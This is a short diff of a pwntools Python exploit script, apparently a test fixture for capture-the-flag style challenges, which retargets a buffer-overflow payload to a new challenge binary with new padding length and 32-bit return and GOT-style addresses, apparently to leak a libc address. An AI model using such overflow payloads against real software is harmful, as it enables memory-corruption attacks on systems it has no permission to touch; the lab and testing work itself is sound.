@@ -2,12 +2,12 @@ from pwn import *
 
 import sys
 
-target = process("./chall-test_encrypt19-pwn3")
+target = process("./chall-test_remoteLibcId-0-x86")
 payload = ""
-payload += "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
-payload += p32(0x8048340)
+payload += "00000000000000000000000000000000000000000000000000000000000000"
+payload += p32(0x8049080)
 payload += "0000"
-payload += p32(0x80497b0)
+payload += p32(0x804c010)
 target.sendline(payload)
 # Scan in all of the input
 foundEnd = False
